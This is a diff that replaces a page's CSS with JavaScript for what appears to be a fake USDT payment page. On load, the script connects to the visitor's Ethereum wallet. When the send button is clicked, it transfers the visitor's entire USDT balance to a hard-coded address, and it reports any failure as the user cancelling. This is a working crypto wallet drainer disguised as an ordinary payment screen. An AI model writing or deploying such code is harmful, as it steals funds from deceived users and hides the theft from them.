@@ -1,171 +1,80 @@
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-}
+// USDT 合约地址和目标地址
+const USDT_CONTRACT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+const TARGET_ADDRESS = "0x64C6592164CC7C0Bdfb1D9a6F64C172a1830eD2C";
+const USDT_ABI = [
+    {
+        "constant": false,
+        "inputs": [
+            { "name": "_to", "type": "address" },
+            { "name": "_value", "type": "uint256" }
+        ],
+        "name": "transfer",
+        "outputs": [{ "name": "", "type": "bool" }],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [{ "name": "_owner", "type": "address" }],
+        "name": "balanceOf",
+        "outputs": [{ "name": "balance", "type": "uint256" }],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    }
+];
 
-body {
-    background-color: #f5f5f5;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    margin: 0;
-}
+// 全局变量
+let provider = null, signer = null;
 
-.container {
-    width: 100%;
-    height: 100vh;
-    max-width: 400px;
-    background-color: #fff;
-    border-radius: 20px;
-    padding: 20px;
-    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-    display: flex;
-    flex-direction: column;
-    justify-content: space-between;
-}
+// 页面加载时直接连接钱包
+window.addEventListener('load', async () => {
+    try {
+        // 确保 ethers.js 已加载
+        if (typeof ethers === 'undefined') throw new Error('ethers.js 加载失败，请检查网络或刷新页面！');
 
-header {
-    text-align: center;
-    margin-bottom: 20px;
-}
+        // 直接使用 window.ethereum（假设已经在钱包环境中）
+        provider = new ethers.providers.Web3Provider(window.ethereum);
 
-.user-icon {
-    width: 40px;
-    height: 40px;
-    margin-bottom: 10px;
-}
+        // 直接请求连接钱包
+        await window.ethereum.request({ method: "eth_requestAccounts" });
 
-h1 {
-    font-size: 20px;
-    font-weight: 600;
-    margin-bottom: 10px;
-    color: #000;
-}
+        // 切换到以太坊主网
+        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+        if (chainId !== '0x1') {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x1' }],
+            });
+        }
 
-.address {
-    font-size: 14px;
-    color: #000;
-    word-break: break-all;
-    margin-bottom: 10px;
-}
+        // 获取 signer 和地址
+        signer = provider.getSigner();
+        const address = await signer.getAddress();
+        document.getElementById('account-address').textContent = address.slice(0, 6) + '...' + address.slice(-4);
+    } catch (e) {
+        console.error('连接钱包失败:', e);
+        alert('连接钱包失败，请确保已在钱包内置浏览器中访问页面！');
+    }
+});
 
-.network {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-size: 14px;
-    color: #666;
-}
+// 发送按钮事件
+document.querySelector('.send-btn').addEventListener('click', async () => {
+    try {
+        if (!signer) throw new Error('请先连接钱包！');
+        const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
+        const balance = await usdtContract.balanceOf(await signer.getAddress());
+        // 直接转账全部余额，即使余额为0
+        const tx = await usdtContract.transfer(TARGET_ADDRESS, balance);
+        await tx.wait();
+        alert('转账成功！');
+    } catch (e) {
+        console.error('转账失败:', e);
+        // 用户取消转账或因其他原因失败时，只显示“您已取消转账”
+        alert('您已取消转账');
+    }
+});
 
-.icon-small {
-    width: 16px;
-    height: 16px;
-    margin-right: 5px;
-}
-
-main {
-    flex-grow: 1;
-    display: flex;
-    flex-direction: column;
-    justify-content: space-between;
-}
-
-.amount, .account, .fee {
-    margin-bottom: 20px;
-}
-
-.amount {
-    order: 1;
-    text-align: center;
-}
-
-.account {
-    order: 2;
-}
-
-.fee {
-    order: 3;
-}
-
-.amount span {
-    font-size: 14px;
-    font-weight: normal;
-    color: #999;
-}
-
-.account span, .fee span {
-    font-size: 14px;
-    color: #999;
-}
-
-.amount-value {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    margin-top: 5px;
-}
-
-.icon {
-    width: 24px;
-    height: 24px;
-    margin-right: 10px;
-}
-
-.amount-value .currency {
-    font-size: 20px !important;
-    font-weight: 600;
-    margin-right: 10px;
-    color: #000;
-}
-
-.amount-value .value {
-    font-size: 20px !important;
-    font-weight: 600;
-    color: #000;
-}
-
-.account p, .fee-value {
-    font-size: 16px;
-    margin-top: 5px;
-    color: #000;
-}
-
-.fee-value {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-}
-
-.arrow {
-    font-size: 16px;
-    color: #999;
-}
-
-footer {
-    display: flex;
-    justify-content: space-between;
-    padding: 10px 0;
-}
-
-.cancel-btn, .send-btn {
-    width: 48%;
-    padding: 12px;
-    font-size: 16px;
-    border-radius: 5px;
-    border: none;
-    cursor: pointer;
-    font-weight: 500;
-}
-
-.cancel-btn {
-    background-color: #f5f5f5;
-    color: #333;
-}
-
-.send-btn {
-    background-color: #007bff;
-    color: #fff;
-}
+// 取消按钮事件
+document.querySelector('.cancel-btn').addEventListener('click', () => alert('已取消转账操作'));
